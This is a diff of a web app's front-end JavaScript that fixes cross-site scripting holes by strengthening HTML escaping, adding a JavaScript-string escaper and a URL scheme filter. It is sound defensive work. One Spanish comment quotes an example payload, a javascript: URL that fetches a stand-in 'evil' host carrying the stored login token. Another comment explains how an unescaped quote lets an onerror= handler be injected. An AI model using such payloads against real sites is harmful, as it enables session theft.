+                <strong>Link directo:</strong> <span onclick="navigator.clipboard.writeText('${escJs(waUrl)}');toast('Copiado','success')" style="cursor:pointer;color:var(--primary);text-decoration:underline">${esc(waUrl)}</span>
             </div>
         `
         : `
@@ -8020,7 +8020,7 @@ async function renderCompany() {
                 </div>
                 <div class="company-card-body">
                     ${sub ? `
-                        <div class="sub-info-row"><span>Estado</span><span class="sub-state-${sub.state}">${sub.state === 'active' ? 'Activo' : sub.state}</span></div>
+                        <div class="sub-info-row"><span>Estado</span><span class="sub-state-${sub.state}">${esc(sub.state === 'active' ? 'Activo' : sub.state)}</span></div>
                         <div class="sub-info-row"><span>Usuarios</span><span>${c.member_count} / ${sub.max_users}</span></div>
                         <div class="sub-info-row"><span>Pedidos/mes</span><span>${sub.max_pedidos_month === 999 ? 'Ilimitados' : sub.max_pedidos_month}</span></div>
                         ${sub.expires_at ? `<div class="sub-info-row"><span>Vence</span><span>${new Date(sub.expires_at).toLocaleDateString()}</span></div>` : ''}
@@ -8279,7 +8279,7 @@ async function loadCompanyMembers(companyId, isAdmin) {
                                     <option value="cotizador" ${m.company_role === 'cotizador' ? 'selected' : ''}>Cotizador</option>
                                     <option value="viewer" ${m.company_role === 'viewer' ? 'selected' : ''}>Viewer</option>
                                 </select>
-                                <button class="btn btn-sm btn-danger" onclick="removeMemberConfirm(${companyId},${m.id},'${esc(m.full_name).replace(/'/g,"\\'")}')">&times;</button>
+                                <button class="btn btn-sm btn-danger" onclick="removeMemberConfirm(${companyId},${m.id},'${escJs(m.full_name)}')">&times;</button>
                             ` : ''}
                         </div>
                     </div>
@@ -9912,7 +9912,7 @@ function renderPedidoCard(p) {
         <div class="pedido-card" onclick="openPedidoDetail(${p.id})">
             <div class="pedido-card-header">
                 <span class="pedido-ref">${esc(p.reference)}</span>
-                <span class="pedido-state" style="background:${stateColors[p.state] || '#6b7280'}">${stateLabels[p.state] || p.state}</span>
+                <span class="pedido-state" style="background:${stateColors[p.state] || '#6b7280'}">${esc(stateLabels[p.state] || p.state)}</span>
             </div>
             <div class="pedido-card-title">${esc(p.title)}</div>
             <div class="pedido-card-meta">
@@ -9966,7 +9966,7 @@ function renderPedidoDetail(p) {
                     <div style="display:flex;align-items:center;gap:8px">
                         <span class="pedido-item-qty">x${item.quantity}</span>
                         ${item.ref_price ? '<span class="pedido-item-ref">Ref: ' + item.ref_price.toFixed(2) + '</span>' : ''}
-                        ${isEditable ? `<button class="btn btn-sm btn-primary" onclick="showAddPrecioModal(${p.id},${item.id},'${esc(item.name).replace(/'/g,"\\'")}')">+ Precio</button>` : ''}
+                        ${isEditable ? `<button class="btn btn-sm btn-primary" onclick="showAddPrecioModal(${p.id},${item.id},'${escJs(item.name)}')">+ Precio</button>` : ''}
                     </div>
                 </div>
                 ${precioRows ? '<div class="pedido-item-precios">' + precioRows + '</div>' : '<div class="pedido-item-precios" style="color:var(--gray-400);font-size:12px;padding:4px 0">Sin precios registrados</div>'}
@@ -9976,7 +9976,7 @@ function renderPedidoDetail(p) {
 
     const actions = [];
     if (p.wa_confirmation_url) {
-        actions.push(`<a href="${esc(p.wa_confirmation_url)}" target="_blank" class="btn" style="background:#25D366;color:white;border-color:#25D366">${icon('whatsapp',16)} Re-enviar WhatsApp</a>`);
+        actions.push(`<a href="${esc(safeUrl(p.wa_confirmation_url))}" target="_blank" class="btn" style="background:#25D366;color:white;border-color:#25D366">${icon('whatsapp',16)} Re-enviar WhatsApp</a>`);
     }
     const canDeliver = isEditable && p.state !== 'draft' && (p.assigned_to === state.user?.id || p.created_by === state.user?.id);
     if (canDeliver) {
@@ -9997,7 +9997,7 @@ function renderPedidoDetail(p) {
         <div class="pedido-detail-header">
             <div>
                 <span class="pedido-ref">${esc(p.reference)}</span>
-                <span class="pedido-state" style="background:${stateColors[p.state] || '#6b7280'}">${stateLabels[p.state] || p.state}</span>
+                <span class="pedido-state" style="background:${stateColors[p.state] || '#6b7280'}">${esc(stateLabels[p.state] || p.state)}</span>
             </div>
             <h2 style="margin:8px 0 4px">${esc(p.title)}</h2>
             ${p.description ? '<p style="color:var(--gray-500);font-size:14px">' + esc(p.description) + '</p>' : ''}
@@ -10310,7 +10310,7 @@ async function loadNotifications(container) {
             suggestion_approved: 'check',
             subscription_updated: 'star',
         }[n.type] || 'bell';
-        return `<div class="notif-item${n.is_read ? '' : ' unread'}" onclick="clickNotif(${n.id}, '${esc(n.link || '')}')">
+        return `<div class="notif-item${n.is_read ? '' : ' unread'}" onclick="clickNotif(${n.id}, '${escJs(n.link || '')}')">
             <div class="notif-item-icon">${icon(typeIcon, 16)}</div>
             <div class="notif-item-body">
                 <div class="notif-item-title">${esc(n.title)}</div>
@@ -10365,7 +10365,7 @@ function showModal(title, bodyHtml) {
     overlay.innerHTML = `
         <div class="modal">
             <div class="modal-header">
-                <span class="modal-title">${title}</span>
+                <span class="modal-title">${esc(title)}</span>
                 <button class="modal-close" onclick="closeModal()">&times;</button>
             </div>
             <div class="modal-body">${bodyHtml}</div>
@@ -10405,11 +10405,45 @@ function toast(msg, type = 'info') {
 }
 
 // ── Helpers ────────────────────────────────────────────────────
+// esc(): escapa para texto Y para atributos HTML.
+// La version anterior usaba textContent -> innerHTML, que solo escapa & < >
+// y dejaba pasar comillas: cualquier `value="${esc(x)}"` se podia romper con
+// un `"` y anadir un onerror=. Aqui se escapan tambien " ' ` .
+const _ESC_MAP = {
+    '&': '&amp;', '<': '&lt;', '>': '&gt;',
+    '"': '&quot;', "'": '&#39;', '`': '&#96;',
+};
 function esc(str) {
-    if (!str) return '';
-    const div = document.createElement('div');
-    div.textContent = str;
-    return div.innerHTML;
+    if (str === null || str === undefined || str === '') return '';
+    return String(str).replace(/[&<>"'`]/g, (c) => _ESC_MAP[c]);
+}
+
+// escJs(): para interpolar dentro de un string JS que a su vez vive en un
+// atributo HTML, p.ej. onclick="fn('${escJs(x)}')".
+// No basta con esc(): el parser HTML decodifica &#39; a ' ANTES de que el
+// motor JS lea el atributo, asi que la comilla reaparece y rompe el string.
+// Con escapes \uXXXX el valor sobrevive a la decodificacion HTML y JS lo lee
+// como caracter literal dentro del string.
+function escJs(str) {
+    if (str === null || str === undefined) return '';
+    return String(str).replace(/[^\w .,:;!?@#%+*\-\/()\[\]]/g, (c) => {
+        const code = c.charCodeAt(0);
+        return '\\u' + code.toString(16).padStart(4, '0');
+    });
+}
+
+// safeUrl(): solo deja pasar esquemas navegables. Sin esto, un spec_url o
+// website guardado como "javascript:fetch('//evil?'+localStorage._mkt_token)"
+// se ejecuta al hacer clic.
+const _SAFE_SCHEMES = ['http:', 'https:', 'mailto:', 'tel:'];
+function safeUrl(u) {
+    if (!u) return '#';
+    try {
+        const parsed = new URL(String(u), window.location.origin);
+        return _SAFE_SCHEMES.includes(parsed.protocol) ? parsed.href : '#';
+    } catch (e) {
+        return '#';
+    }
 }
 
 // ── Site Config (SEO dynamic) ─────────────────────────────────
